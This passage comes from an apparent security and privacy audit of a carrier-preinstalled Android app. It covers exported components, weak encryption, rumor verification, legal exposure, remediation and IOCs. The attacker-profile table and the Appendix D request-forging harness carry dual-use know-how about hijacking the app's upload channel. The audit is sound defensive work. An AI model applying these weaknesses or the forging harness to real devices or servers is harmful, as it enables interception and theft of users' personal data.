- Any app can `startActivity` it, triggering system permission dialogs — a vehicle for **permission phishing**;
- The `tv_device_info` view renders the full device-info JSON produced by `c.b(ctx)`, readable via screenshots or accessibility services;
- The name contains `Test` — a leftover debug entry point that should not ship in production.

### 6.10.2 Three Exported Receivers

`OnBootReceiver`, `SIMStateReceiver`, and `ConnectStateReceiver` are all exported without permission. Although `BOOT_COMPLETED`, `CONNECTIVITY_CHANGE`, and `SIM_STATE_CHANGED` are protected broadcasts that ordinary apps cannot forge directly:

- `PendingIntent` reuse and implicit-intent combinations still provide trigger paths;
- Repeated triggering causes **battery and traffic consumption** (each trigger rebuilds collection threads);
- `SIMStateReceiver` holds a static Context for `unregisterReceiver`, risking `IntentReceiverLeaked`.

### 6.10.3 Remediation

Remove `TestActivity`; set every receiver to `exported="false"` (system broadcasts do not require export).

## 6.11 S-08 — Private AIDL and Hidden APIs; No Signature Check Before Binding 【Medium】

### 6.11.1 Evidence

```java
// RegisterIntentService
intent.setComponent(new ComponentName("com.android.phone",
        "com.android.phone.nubia.NBExtTelephonyService"));        // Nubia
intent.setComponent(new ComponentName("com.gree.telephonymanager",
        "com.gree.telephonymanager.GreeTelephonyManagerService")); // Gree
context.bindService(intent, conn, 1);        // no signature check on the target
```

### 6.11.2 Issues

| Issue | Description |
|---|---|
| No signature check before binding | A same-named component can impersonate the real one (older Android), returning forged dual-SIM data |
| Reliance on non-public APIs | `ITelephonyEx`, `TelephonyManagerEx`, `ColorOSTelephonyManager`, `HwTelephonyManager`, `MzTelephonyManager` — breaks on every ROM update |
| Reflective hidden-API use | `Class.forName("android.os.SystemProperties")` reading `ro.*` (including `ro.bd.cmcc_*`, `ro.bird.*`) |
| Weak error handling | Reflection failures only `printStackTrace`; fields stay empty but are still uploaded |
| **Unbounded busy-wait** | See below |

### 6.11.3 A Thread-Killing Pattern

```java
while (f.A == null) {
    Thread.sleep(5);          // no timeout, no interruption check
}
```

In `RegisterIntentService.onHandleIntent`, if the vendor-private Binder never becomes available, the worker thread **blocks forever** with no self-recovery.

### 6.11.4 Remediation

Verify the target's signature via `PackageManager` before binding; degrade gracefully when private APIs are missing; add timeouts and interruption checks to the wait loop; replace `SystemProperties` with public `Build` fields.

## 6.12 S-09 — No Integrity Verification; Freely Repackageable 【Medium】

- No APK self-signature check, no DEX integrity check, no hardening;
- Changing the default `serverAddress` or swapping the upload domain and repackaging takes effect immediately;
- Worse: **because S-01 exists, repackaging is not even necessary** — a single runtime string change suffices.

## 6.13 S-10 — Weak Digests and Key Management 【Low】

- v1 signature uses `SHA1withRSA` (v2/v3 mitigate downgrade attacks);
- The signing certificate is valid for 28 years and the upload public key for 100 — both far beyond reasonable rotation cycles;
- No key versioning.

## 6.14 S-11 — Code Defects 【Low】

| Location | Defect | Consequence |
|---|---|---|
| `b.c.a.b.c` | `if ("3.0" != 0)` compares a string to an integer | Always true; logic dead |
| `b.c.a.a.c#a` | `if (i3>=26){...} else if (i3>=30){...}` | Second branch unreachable; SDK≥30 path shadowed |
| `control.e#b()` | `listA` may be null, then `.iterator()` is called | Potential NPE |
| `control.g#a(boolean)` | Empty method body | Upload result discarded |
| `b.c.a.b.b#d(long)/j(long)` | Empty implementations | `totalData1/2` always 0; data quality degraded |
| `b.c.a.b.d#onUpgrade` | Empty implementation | Silent data loss on upgrade |
| `b.c.a.b.l#a()` | Hard-coded absolute path deletion | Fails in multi-user / app-cloning environments |
| `control.f` | Only overrides the constructor, not `run()` | `RegType=R` (signal upload) path is inert |
| `control.b` | Compares strings with `!=` in `String.valueOf(lastKnownLocation) != strA` | Always true; registers duplicate location listeners |

## 6.15 S-12 — No Validation of External Input 【Low】

```java
// b.c.a.b.e — GET /public/ip
String ip = new b.c.a.b.e().a();

// consumed directly in the f1.b callback
cVar.C = str;      // written to the IPv4 field with no format or length validation
```

Over cleartext HTTP an on-path attacker can inject arbitrary strings, corrupting the upload and providing an injection vector if the server does not validate.

## 6.16 Attacker Profiles and Cost

| Attacker | Capability | Achieves | Cost |
|---|---|---|---|
| **Ordinary malicious app (zero permissions)** | Bind the exported service | Hijack the entire upload stream (S-01) | **Very low** (~30 lines) |
| On-path attacker | Sniff traffic / hijack DNS | Ciphertext plus a derivable key (S-02+S-03) | Low (public Wi-Fi) |
| Holder of the platform signing key | Sign a same-signature APK | Same-UID access to plaintext stores, inherited permissions (S-04) | Medium (needs the key) |
| Physical access (repair / forensics) | Root / debug | Read plaintext databases and logs (S-05+S-06) | Medium |
| Supply-chain attacker | Repackage | Replace the upload address, implant a backdoor (S-09) | Medium |

---

# Chapter 7 — Why the Two Layers Multiply

Each layer is severe on its own. The real danger is **multiplicative**:

| Privacy issue | × Security flaw | = Amplified consequence |
|---|---|---|
| P-02 collects identity and behavior across 39 fields | S-01 the channel is rewritable by any app | Any small utility can harvest verified identity, location, and profiles at scale |
| P-02 collects IMEI/IMSI/ICCID | S-02 cleartext + S-03 derivable key | The data is effectively unencrypted on the wire |
| P-03 silent periodic upload | S-01 + S-06 remotely enable logging | The attacker gets both a continuous stream and a local plaintext copy |
| P-06 600 plaintext rows retained | S-04 platform key + sharedUserId | A second-hand device or same-UID app can reconstruct the prior owner's identity and track |
| P-05 users cannot disable it | S-07 exported components | Users cannot switch it off, nor prevent others from exploiting it |
| P-02 app inventory | S-01 channel hijack | An attacker can target specific populations (e.g., patients of a particular condition) |

**In one sentence:** layer one concentrates the data; layer two makes the concentrated data flow untrustworthily. Together they turn this app into **a sensitive-data collection terminal running on the user's device, controllable by any third party**.

---

# Chapter 8 — External Rumor Verification

Two external claims were checked with a full class-by-class decompilation. The standalone report is `核实报告_录屏与APK上传.md`.

## 8.1 Verdicts

| Allegation | Verdict | One-line basis |
|---|---|---|
| Records the screen | **Not supported** | All four stages (authorization / capture / encoding / transfer) are **absent** |
| Uploads all APK package names | **Supported** | `getInstalledApplications(0)` + `pkgName`, every 7 days |
| Uploads APK files | **Not supported** | No file reads, no multipart; the body is always a single JSON |

## 8.2 Screen Recording: Stage-by-Stage

Implementing screen recording on Android requires all four stages. Missing any one means it does not happen.

### Stage 1 — Obtain MediaProjection authorization

| Check | Result |
|---|---|
| `MediaProjectionManager` / `MediaProjection` | **0 hits** |
| `createScreenCaptureIntent()` | **0 hits** |
| `FOREGROUND_SERVICE` / `FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION` | **Absent from the manifest** |
| A MediaProjection foreground service | **Absent** (only 3 services, all telephony/registration) |

Since Android 5.0, recording requires explicit user authorization through a system dialog; Android 10+ additionally mandates a foreground service with a persistent notification. This app has neither call nor service — **the user would never have seen a recording consent dialog**.

### Stage 2 — Capture the screen

| Path | Result |
|---|---|
| `VirtualDisplay` + `ImageReader` | **0 hits** |
| `SurfaceControl` / `ScreenshotClient` (hidden system APIs) | **0 hits** |
| `PixelCopy` / `DisplayManager` / `getDisplay()` | **0 hits** (the sole `getDisplay` hit is `getDisplayMetrics`, used for UI density) |
| `MediaRecorder` + `Surface` | **0 hits** |
| AccessibilityService + `takeScreenshot` | **0 hits**; no `BIND_ACCESSIBILITY_SERVICE` in the manifest |
| `/dev/graphics/fb0` direct framebuffer read | **0 hits** |
| root `screencap` / `screenrecord` | `Runtime.exec` / `ProcessBuilder` / `/bin/sh` — **all zero** |

**Ownership of the six `Bitmap`/`Canvas` hits:**

| Class | Actual identity |
|---|---|
| `android.support.v4.graphics.drawable.*` | Library: icon tinting |
| `android.support.v7.widget.*` | Library: widget drawing |
| `a.b.b.a.h` / `a.b.b.a.i` | Library: Drawable wrappers (`setFilterBitmap` forwarding) |
| `a.b.d.c.a.c` | Library: Drawable wrapper (`draw(Canvas)` forwarding) |

None belong to first-party business code, and all are forwarding calls that **capture nothing**.

### Stage 3 — Encode and persist

| Check | Result |
|---|---|
| `mp4` / `video/` / `MediaRecorder` / `MediaCodec` | **All zero** |
| `getExternalFilesDir` / `openFileOutput` | **Zero** |
| Sole `FileOutputStream` hit | `a.b.c.b.i` = **TypefaceCompatUtil** (copies a font resource to cache) |

Recording necessarily produces a continuous video stream or file. This app has no video encoding or media writing capability.

### Stage 4 — Transfer

| Check | Result |
|---|---|
| `multipart` / `boundary` / `filename` / `Content-Disposition` | **All zero** |
| `application/octet-stream` | **Zero** |
| Actual form | A single POST whose body is AES-encrypted JSON |

Even assuming recorded data existed, there is no file-upload channel to carry it out.

### Verdict

**All four stages are absent, and no dynamic-loading or native-library path could bypass static analysis → "this app records the screen" is not supported.**

## 8.3 APK Upload: Partly Supported

### 8.3.1 Supported — package names and metadata

```java
// control.e#b()
PackageManager pm = context.getPackageManager();
List<ApplicationInfo> installed = pm.getInstalledApplications(0);   // every installed app
List<UsageStats> stats = usageStatsManager.queryAndAggregateUsageStats(t0, t1);

// b.c.a.b.b#a()
jSONObject.put("appLabel", ...);   jSONObject.put("pkgName", ...);
jSONObject.put("runTime", this.c + "min");
jSONObject.put("tx1", ...);  jSONObject.put("rx1", ...);
jSONObject.put("tx2", ...);  jSONObject.put("rx2", ...);
jSONObject.put("totalData1", ...);  jSONObject.put("totalData2", ...);
jSONObject.put("totalDataWiFi", ...);
```

Aggregated into `AppInfo[]` and uploaded with the JSON, **every 7 days**.

**Verdict: supported — and worse than the rumor** (names, usage time, per-SIM traffic, not just package names).

### 8.3.2 Not Supported — APK files themselves

| Check | Result |
|---|---|
| `ApplicationInfo.sourceDir` / `publicSourceDir` | **0** |
| `getPackageArchiveInfo` / `PackageParser` | **0** |
| `ZipFile` (required to open an APK) | **0** |
| Traversal of `/data/app` | **0** |
| `.apk` string | 0 valid hits (the single `grep` match was a regex false positive) |

Combined with Stage 4: the transport layer accepts only a single JSON body. **"Uploads APK files" fails at both the collection and the transport end.**

## 8.4 Why the "Not Supported" Verdict Is Strong

DEX requires every invocation to be registered in `method_ids`, which references class names in `string_ids`. Therefore any called API's class name necessarily appears in `classes.dex` — **unless the code loads dex dynamically or uses a native library**. Both paths were verified empty:

| Bypass | Check | Result |
|---|---|---|
| Dynamic loading | `DexClassLoader` / `PathClassLoader` / `InMemoryDexClassLoader` / `dalvik/system` / plugin frameworks | **All zero** |
| Native library | `.so` count, `loadLibrary` | **0 .so files, 0 calls** |

Additionally, `Class.forName` appears once and loads only `SystemProperties` and `TelephonyManager` variants — **none display- or imaging-related**.

## 8.5 Why the Rumor Probably Exists

Three plausible explanations (speculation, not conclusions):

1. **Confusion with another preinstalled component** — carrier handsets often also ship a remote-assistance app, which genuinely can share the screen, but that is a different APK.
2. **Location capture misread as "monitoring"** — `SignalInfo` does contain coordinates, but the nature is location collection, not screen collection.
3. **`getInstalledApplications` misread as "uploading APKs"** — seeing full app enumeration, one may infer the APKs themselves are taken, when only metadata is.

## 8.6 Four Corrections Made During Verification

Class-by-class review surfaced four places where the first draft needed correction — **three aggravating, one mitigating**.

### 8.6.1 [Aggravating] Real GPS capture exists

```java
// control.b#onSignalStrengthsChanged()
if (b.c.a.b.f.e) {                                     // SignalInfo switch
    LocationManager lm = (LocationManager) ctx.getSystemService("location");
    Location last = lm.getLastKnownLocation("fused");
    strA = a(last);                                     // "longitude: x latitude: y altitude: z speed: … bearing: … accuracy: …"
    lm.requestLocationUpdates("fused", 1000L, 10.0f, new a(lm));   // 1 second / 10 meters
    jSONObject.put("location", strA);                   // ← coordinates in plaintext
    m.a(ctx, ...).a(jSONObject.toString());             // written to the signal database
}
```

**The first draft's judgment — "no active location calls, `ACCESS_FINE_LOCATION` likely redundant" — was wrong.**

But note: this path is gated by `b.c.a.b.f.e`, which defaults to `false`, and **no code path setting it to `true` was found**. The capability exists and is off by default; what turns it on may be a custom ROM configuration or a server-issued setting `[C]`.

### 8.6.2 [Aggravating] A second plaintext database, larger than the first

```java
// b.c.a.b.m
public static String c = "signalhelper";   // database
public static String d = "signal";          // table
sQLiteDatabase.execSQL("create table signal(id integer primary key autoincrement, jsonString text)");
if (cursorQuery.getCount() >= 500) { ... }  // cap: 500 rows
```

The first draft covered only `systemhelper/history` (100 rows). There is also `signalhelper/signal` (**500 rows**) holding RSRP/SINR + cellid + LAC + timestamp + **coordinates**, likewise unencrypted.

### 8.6.3 [Aggravating] Memory and storage capacity are also collected

```java
// b.c.a.b.i#c()
jSONObject.put("RAM", strD);
jSONObject.put("ROM", strE);
jSONObject.put("FREE", strA);
```

Reads `/proc/meminfo` and `StatFs`; called by **18 adapters**; written into the `SubType` field.

### 8.6.4 [Mitigating] Some models have genuine consent gating

See 5.2.5. The first draft's "`f.g` defaults to true and no interactive path exists anywhere" was **too absolute**; the accurate statement is 8 adapters with real consent, 19 with a weak check, the rest with none.

### 8.6.5 Summary of Corrections

| # | First draft | Corrected | Direction |
|---|---|---|---|
| 1 | No active location calls | Fused location (1s/10m) exists, gated by the default-off `f.e` | Aggravating |
| 2 | One plaintext database of 100 rows | Plus a `signal` database of 500 rows with coordinates | Aggravating |
| 3 | 39 collected fields | Plus RAM/ROM/FREE via `SubType` | Aggravating |
| 4 | `f.g` defaults to true, no interactive path | 8 adapters with real consent gating, 19 weak | Mitigating |

## 8.7 Limits of This Verification

1. **Other preinstalled components on the same device cannot be excluded.** This covers one APK. If the rumor describes whole-device behavior, each other preinstalled app must be analyzed.
2. **Server-side dynamic configuration cannot be excluded.** `f.e` (GPS) and `f.d` (Xiaomi dynamic model matching) have no in-package path setting them true; a server-issued configuration could activate 8.6.1 `[C]`.
3. **Custom ROM variants cannot be excluded.** This sample is `1.2-20221110`; vendors may build per-model variants.
4. **No dynamic verification was performed.**

---

# Chapter 9 — Legal Analysis

| Layer | Likelihood | Notes |
|---|---|---|
| **Civil infringement** | **Very high** | All four elements are met (see 5.13); remedies include cessation, deletion, and damages |
| **Administrative violation** | **Very high** | Violates PIPL and MIIT regulations; actionable by CAC or MIIT |
| **Criminal liability** | **Insufficient evidence** | No evidence of "selling / providing / unlawfully obtaining"; not asserted |

## 9.1 Principal Administrative Bases

| Instrument | Provision | Violation | Consequence |
|---|---|---|---|
| PIPL | Art. 6 / 13 / 17 / 29 / 51 | Over-collection, no basis, no disclosure, no separate consent, no safeguards | **Art. 66:** order to correct, warning, confiscation of illegal gains; up to RMB 1,000,000 if uncorrected; **in serious cases up to RMB 50,000,000 or 5% of prior-year turnover**, plus suspension of business, rectification, or license revocation; responsible individuals RMB 100,000–1,000,000 |
| MIIT Order No. 24 | Art. 8, 9 | Rules not published; collection without consent | Order to correct, administrative penalty |
| Preinstalled app regulation (2016 No. 407) | Art. 6, 7 | Collection without consent; not uninstallable | Order to correct |

## 9.2 Anticipated Defenses and Assessment

| Defense | Assessment |
|---|---|
| "It is basic-function software required for communications" | Partially valid — covers the 7 device-attribute fields, **not the other 32** (app inventory, cell data, and phone numbers have no causal link to communications) |
| "Fulfilling Cybersecurity Law Art. 21 obligations" | Does not hold. That article requires retaining **network logs**, not installed-app lists or cell trajectories |
| "Disclosure is present (the text is in resources)" | Does not hold, and cuts the other way. The text has no display path; the law requires disclosure "in a prominent manner", not compilation into an APK |
| "Users consented (enabled by default)" | Does not hold. Default consent is not a "voluntary, explicit" manifestation of intent, and it is bundled consent |
| "Some models have a system-level consent switch" | Partially valid (8 adapters), but does not cover most models and does not satisfy "separate consent" |

## 9.3 Why the Criminal Path Does Not Currently Apply

Criminal Law Article 253-1 requires "violating state regulations by **selling or providing** citizens' personal information to others" or "**unlawfully obtaining**" it.

This app is preinstalled by the carrier on its own customized handsets and transmits data to the carrier's own server — from the code, a self-collect/self-use arrangement with no third-party recipient.

**However:** if data sharing with third parties is established, or if a server breach causes a leak, the nature changes immediately — potentially engaging Article 253-1 or Article 285 (unlawfully obtaining computer information system data).

---

# Chapter 10 — Remediation Plan

## 10.1 Privacy

| Priority | Measure | Item | Effort |
|---|---|---|---|
| P0 | Remove `AppInfo[]` and `SignalInfo` collection; drop cell fields | P-02 | 3 person-days |
| P0 | Hash or mask IMEI/IMSI/ICCID/MSISDN | P-02 | 2 person-days |
| P0 | Full privacy policy + separate consent for sensitive items + degraded operation on refusal | P-01 | 5 person-days |
| P1 | Provide a collection switch bound to `f.g`, with withdrawal | P-01, P-05 | 2 person-days |
| P1 | Disclose recipient, purpose, retention, sharing, cross-border | P-04 | 1 person-day |
| P1 | Remove the forced VoLTE write | P-07 | 0.5 person-day |
| P1 | Encrypt both databases + TTL + secure deletion after upload | P-06 | 2 person-days |
| P2 | Provide access / deletion / export channels | P-05 | 3 person-days |
| P2 | Replace Doze-penetrating exact alarms with `WorkManager` | P-03 | 1 person-day |
| P2 | Age detection and guardian consent for minors | P-08 | 2 person-days |

## 10.2 Security

| Priority | Measure | Item | Effort |
|---|---|---|---|
| P0 | `RegisterHelperService` → `exported="false"`, or add permission + UID check | S-01 | **0.5 person-day** |
| P0 | `serverAddress` allow-list validation + HMAC | S-01 | 1 person-day |
| P0 | HTTPS end to end + certificate pinning + disable cleartext | S-02 | 2 person-days |
| P0 | Rebuild crypto: AES-256-GCM + random session key + RSA-OAEP; 2048-bit key | S-03 | 3 person-days |
| P1 | Strip plaintext logging in release; forbid Binder from toggling it | S-06 | 1 person-day |
| P1 | Encrypt both SQLite databases + `MODE_PRIVATE` | S-05 | 2 person-days |
| P2 | Remove `TestActivity`; set all receivers to `exported="false"` | S-07 | 1 person-day |
| P2 | Verify signatures before binding vendor services; add wait timeouts | S-08 | 2 person-days |
| P2 | Add APK self-signature verification | S-09 | 2 person-days |
| P3 | Rotate keys (signing certificate + upload public key) | S-04, S-10 | Vendor coordination |
| P3 | Fix the S-11 defects | S-11 | 1 person-day |

> **The best return is S-01: 0.5 person-day removes the single most dangerous path.** It should be the absolute first priority.

## 10.3 Suggested Sequencing

```
Week 1    S-01 (0.5d) + S-02 (2d) + serverAddress validation (1d)      → removes ~60% of risk
Week 2    S-03 crypto rebuild (3d) + S-06 logging (1d)                 → another ~15%
Weeks 3-4 P-02 collection reduction (5d) + P-01 consent (5d)           → another ~20%
After     P-06 / S-05 / S-07 / S-08 / S-09 and so on                    → remainder
```

---

# Chapter 11 — User-Side Mitigation

Until the vendor ships a fix, users can try the following (effectiveness varies by ROM and privileges):

| Measure | Command / action | Feasibility |
|---|---|---|
| Check whether it is preinstalled | `adb shell pm list packages -s \| grep systemhelper` | Yes |
| Try to disable | `adb shell pm disable-user --user 0 com.mobiletools.systemhelper` | Often refused for system apps |
| Revoke runtime permissions | `adb shell pm revoke com.mobiletools.systemhelper android.permission.READ_PHONE_STATE` | May be restored after reboot on some models |
| Turn off the carrier improvement program | Settings → Privacy/Security → related switch (works only on some models) | Works on vivo/Baidu customized units |
| Restrict background data | Settings → Apps → Data usage | Depends on ROM |
| Third-party firewall | NetGuard / AFWall+ (root required) | Blocks upload, but local collection continues |
| Revoke the alarm permission | Settings → Apps → Special access | Reduces wakeup frequency |
| Before resale | Factory reset | Clears the 600 local rows |

**One point users must be told:** none of the above **can retract data already uploaded**. To exercise the right to deletion, a formal request must go through the carrier's customer-service channel.

---

# Chapter 12 — Conclusion

## 12.1 Privacy

This application is designed for silent, continuous, comprehensive collection. It left a fragmentary disclosure text that it never shows anyone, and a consent switch that only takes effect on a minority of models.

Zero of the ten statutory rights are implemented; none of the six legal bases holds. This is not a "compliance blemish" — **the collection model itself is incompatible with the framework of personal information protection**.

## 12.2 Security

An unprotected exported service, a cleartext HTTP link, an encryption scheme whose key derives from the plaintext, and a platform-level CA key together form a **structural collapse of trust**. The worst item costs almost nothing to exploit, and it controls the most sensitive data channel.

## 12.3 The Relationship Between the Two

It is neither "insecure, therefore a privacy problem" nor "over-collecting, therefore insecure". **The two flaws sit end to end on the same data path**: unlimited collection at the front, undefended transmission at the back. Fixing either one alone is insufficient.

## 12.4 On the External Rumor

"Records the screen" is not supported — and that verdict is not "we did not find it", but four stages of evidence all missing, with no path around static analysis.

"Uploads all APK package names" is supported. But the more interesting finding is different: **this app contains real GPS capture code, held back only by a switch that defaults to off**. Who can turn that switch on, and whether it can be enabled remotely, is a better question than whether it records the screen.

## 12.5 One-Line Recommendation

> Fix S-01 (0.5 day), reduce P-02 (5 days), rebuild S-02/S-03 (5 days) — **under two weeks of work removes 80% of the risk described in this report**.

---

# Appendices

## Appendix A — Core Code Index

### A.1 Package Semantics

| Package | Nature | Classes |
|---|---|---|
| `com.mobiletools.systemhelper.*` | **Business layer (names unobfuscated)** | 30 |
| `b.c.a.a.*` | Device info readers + vendor adapters | 59 |
| `b.c.a.b.*` | Infrastructure (crypto / HTTP / SQLite / logging / prefs) | 15 |
| `b.a.b.a.*` / `b.b.a.*` | Vendor-private AIDL (Gree / Nubia) | 7 |
| `android.support.*` / `android.arch.*` / `androidx.*` / `a.b.*` / `a.a.a.*` | Third-party libraries (incl. R8-renamed AppCompat) | ~704 |

### A.2 `b.c.a.b.*` Single-Letter Map

| Class | Function |
|---|---|
| `a` | AlarmManager scheduler (4 entry points, all self-rearming) |
| `b` | AppInfo per-app model |
| `c` | Crypto (MD5 / AES-ECB / RSA entry) |
| `d` | SQLite (`systemhelper` / `history`, 100 rows) |
| `e` | HTTP GET (public IP) |
| `f` | **Global constants and state** (URLs, intervals, switches) |
| `g` | **HTTP POST** (upload) |
| `h` | Field masking (non-Unicom SIMs only) |
| `i` | Memory/storage collection (RAM/ROM/FREE) |
| `j` | Logging wrapper |
| `k` | RSA (reads `pub.cer`) |
| `l` | SharedPreferences wrapper |
| `m` | SQLite (`signalhelper` / `signal`, 500 rows) |
| `n` | Signal data model (3 fields) |
| `o` | Reflection helper (Class.forName + getDeclaredMethod) |

### A.3 Where to Look

| What | Class / method | Line | Key statement |
|---|---|---|---|
| Plaintext JSON | `control.c#a()` | — | 39 `jSONObject.put(...)` calls |
| Plaintext logging | `control.g#a(c)` | **33** | `"register postString：" + strA` |
| MD5 | `control.g#a(c)` | **36** | `b.c.a.b.c.a(strA)` |
| RSA signature | `control.g#a(c)` | **37** | `c.a(c.a(ctx, bArrA))` |
| URL assembly | `control.g#a(c)` | **38** | `l.c(ctx) + "?ver=3.0&..."` |
| AES | `control.g#a(c)` | **39** | `c.a(strA, bArrA)` |
| POST | `control.g#a(c)` | **42** | `gVar.a(str, bArrA2, bArrA)` |
| Consent switch | `control.g#run()` | **123** | `if (b.c.a.b.f.g)` |
| AES primitive | `b.c.a.b.c#a(String,byte[])` | **43** | `AES/ECB/PKCS5Padding` |
| Constants | `b.c.a.b.f` | **20,36-39** | `g=true`, URLs, 24h, 7d |
| Exported service | `RegisterHelperService` | **24-49** | 5 Binder methods |
| Boot delay | `OnBootReceiver#onReceive` | — | `b(f611a, 240000L)` |
| Doze penetration | `b.c.a.b.a` | — | `setExactAndAllowWhileIdle` |
| App inventory | `control.e#b()` | — | `getInstalledApplications(0)` |
| IMEI/IMSI | `b.c.a.a.c#b(Context,c)` | — | `getImei(0/1)`, `getSubscriberId()` |
| Cell info | `b.c.a.a.c#a(Context,int,c)` | — | `CellIdentityLte.getCi()/getTac()` |
| GPS capture | `control.b#onSignalStrengthsChanged` | — | `requestLocationUpdates("fused",1000L,10.0f,…)` |
| Forced VoLTE | `b.c.a.a.c#a(Context,int)` | — | `setAdvancedCallingSettingEnabled(true)` |

### A.4 JADX Search Terms

| Looking for | Search | Hits |
|---|---|---|
| Upload address | `dm.wo.com.cn` | `b.c.a.b.f` (only occurrence) |
| Upload thread | `register postString` | `control.g` |
| Plaintext logging | `Clear Text` | `b.c.a.a.f1#c` |
| Crypto | `AES/ECB` | `b.c.a.b.c` |
| Exported service | `registerhelper Service onBind` | `RegisterHelperService` |
| Boot delay | `boot delayed for 4 minutes` | `OnBootReceiver` |
| Forced VoLTE | `before open:false` | `b.c.a.a.c` |
| GPS capture | `requestLocationUpdates` | `control.b` |
| Consent gating | `operator_service_improve_plan` | 6 adapters |

## Appendix B — Review of All 815 Classes

| Package | Classes | Nature | Method | Conclusion |
|---|---|---|---|---|
| `b.c.a.a` | 59 | Device readers + vendor adapters | Class by class | Telephony reads and reflection only, **no screen/file capability**; 8 have consent gating |
| `b.c.a.b` | 15 | Infrastructure | Class by class | Crypto/HTTP/SQLite/logging/prefs/memory/reflection; **no screen capture** |
| `com.mobiletools.systemhelper` | 30 | Business layer | Class by class | Collection scheduling and upload; **no screen capture**; `control.b` contains GPS capture |
| `b.a.b.a` / `b.b.a` | 7 | Vendor AIDL | Class by class | Telephony extension interfaces only |
| `a.a.a.*` | 10 | AppCompat (R8-renamed) | Sampled | Upstream library code |
| `a.b.a.*` / `a.b.b.*` / `a.b.c.*` / `a.b.d.*` | ~180 | **AppCompat / AndroidX (R8-renamed)** | Sampled (`a.b.c.a.a`=ContextCompat, `a.b.c.g.a`=AbsSavedState, `a.b.d.a.a`=R.styleable) | Upstream library code |
| `android.support.*` / `android.arch.*` / `androidx.*` | ~524 | Third-party | By package | Upstream library code |

**Key determination:** `a.b.*` and `a.a.a.*` are **not first-party business code** but R8-renamed support libraries. This correction reduces the first-party code count from "about 300 classes" to "about 111".

## Appendix C — Decompilation Artifacts

Two exports of the same code live in `audit/decompiled/`:

| Directory | Content | Size |
|---|---|---|
| `raw/` | JADX output, **obfuscated** | 20 files / 3,253 lines |
| `deobfuscated/` | Manually renamed, **deobfuscated** | 9 files / 1,322 lines |

**Important:** the sample ships no `mapping.txt`, so automatic deobfuscation is impossible. Names in `deobfuscated/` are manual semantic inferences, not original identifiers; for absolute fidelity use `raw/`.

Two excerpts are flagged in-file: the `f1.java` model table (200+ → 40 entries) and `RegisterIntentService.onHandleIntent` (JADX failure, transcribed from smali semantics).

## Appendix D — Local Verification

`tools/` provides a closed-loop harness that reconstructs a well-formed request using `assets/pub.cer` and sends it to a local mock server (never to any external host).

```powershell
# Terminal 1
python -u capture_server.py 8080

# Terminal 2
bash forge_request.sh sample_valid.json http://127.0.0.1:8080/registerv3
bash ./curl_cmd.sh
```

The mock server implements nine validation stages (UA, content type, parameters, signature length, body alignment, decryption, business fields, deduplication, rate limiting). All four paths were measured:

| Scenario | Result |
|---|---|
| Invalid sample (IMEI fails Luhn; number/operator mismatch) | `409` |
| Valid sample | `200` + `regId` |
| Duplicate submission of the same signature (RSA determinism) | `416` (treated as success by the client) |
| Bare curl (no Dalvik UA) | `403` |

**Crypto finding verified empirically:** decrypting the body with `MD5(plaintext)` reproduces the original byte for byte.

**ECB finding verified empirically:** all 71 ciphertext blocks in this sample are unique; no block repetition was observed — this should not be overstated as "visible repeated blocks".

## Appendix E — Sample Fingerprint and IOCs

```
File        : SystemHelper_1.2-20221110.apk
Size        : 1,762,193 bytes
MD5         : a78da3f746597509ab61054689a65353
SHA-256     : 6658c4be127bdf57ae276a91ae686a9fe26e65f17ee3ba5dec91c61d51fee3b4
Package     : com.mobiletools.systemhelper
Version     : 1.2-20221110 (versionCode 3)
minSdk      : 24 / targetSdk: 33 / compileSdk: 33
DEX         : classes.dex (1,171,504 bytes)
Classes     : 815 / 192 packages

Signing cert: CN=bbkmobile.com.cn, OU=IQOO, O=BBK, C=CN
              serial b153730d8a352539, 2012-09-25 → 2040-02-11
              SHA1withRSA / 2048 bit / BasicConstraints CA:true
              SHA-256: BC:C3:5D:4D:36:06:F1:54:F0:40:2A:B7:63:4E:84:90:
                       C0:B2:44:C2:67:5C:3C:62:38:98:69:87:02:4F:0C:02

Upload key  : assets/pub.cer (DER)
              subject C=CN, ST=BJ, L=BJ, O=UNICOM, OU=UNICOM, CN=UNICOM
              1024-bit RSA, 2019-05-24 → 2119-04-30

Network IOCs: dm.wo.com.cn:18080
              /registerv3   (upload, POST)
              /public/ip    (public IP echo, GET)
              Content-Type: application/encrypted-json
              URL params: ver, model, manuf, sign

Local files : /data/data/com.mobiletools.systemhelper/databases/systemhelper
              /data/data/com.mobiletools.systemhelper/databases/signalhelper
              /data/data/com.mobiletools.systemhelper/shared_prefs/
                  com_mobiletools_systemhelper_preference.xml

Log tags    : RegisterThread, DeviceManager, DeviceInfo, DeviceInfoReaderBase,
              HttpEncryptHelper, GetIPAddressThread, RegisterHelperService,
              DMTelephonyCallback, MemoryUtils, DMPhoneStateListener

Config keys : serverAddress, preference_enable_log, scheduleInterval,
              appInfoInterval, signalInfoInterval, firstPowerOn, iccid1, iccid2,
              dm_user_agreement (system settings),
              operator_service_improve_plan (system settings)

Components  : com.mobiletools.systemhelper.service.RegisterHelperService
              com.mobiletools.systemhelper.Activity.TestActivity
```

## Appendix F — Legal Provision Index

| Provision | Subject | Cited in |
|---|---|---|
| PIPL Art. 6 | Minimum necessity, least-impact means | 5.3, 5.10.1 |
| PIPL Art. 13 | Six legal bases (closed list) | 5.10.1 |
| PIPL Art. 14 | Consent must be voluntary and explicit | 5.2.4 |
| PIPL Art. 15 | Right to withdraw consent | 5.6.1 |
| PIPL Art. 17 | Seven disclosure obligations | 5.2.3 |
| PIPL Art. 24 | Automated decision-making (profiling) | 5.11.3 |
| PIPL Art. 28 | Definition of sensitive personal information | 4.3 |
| PIPL Art. 29 | Separate consent for sensitive data | 5.2.6 |
| PIPL Art. 31 | Minors under 14: guardian consent | 5.9 |
| PIPL Art. 44–49 | Ten data-subject rights | 5.6.1 |
| PIPL Art. 50 | Rights-request handling mechanism | 5.6.1 |
| PIPL Art. 51 | Security measures (encryption, de-identification) | 5.10, 6.5.2 |
| PIPL Art. 66 | Penalties (up to RMB 50M or 5% of turnover) | 9.1 |
| PIPL Art. 69 | Presumption of fault | 5.13 |
| Civil Code Art. 1034–1039 | Privacy and personal information | 5.13 |
| Cybersecurity Law Art. 21 | Network log retention (not app lists) | 9.2 |
| Criminal Law Art. 253-1 | Infringement of citizens' personal information | 9.3 |
| Criminal Law Art. 285 | Unlawfully obtaining computer data | 9.3 |
| MIIT Order No. 24, Art. 8, 9 | Publish rules; no collection without consent | 9.1 |
| 2016 No. 407, Art. 6, 7 | Preinstalled apps: no collection without consent; must be uninstallable | 9.1 |
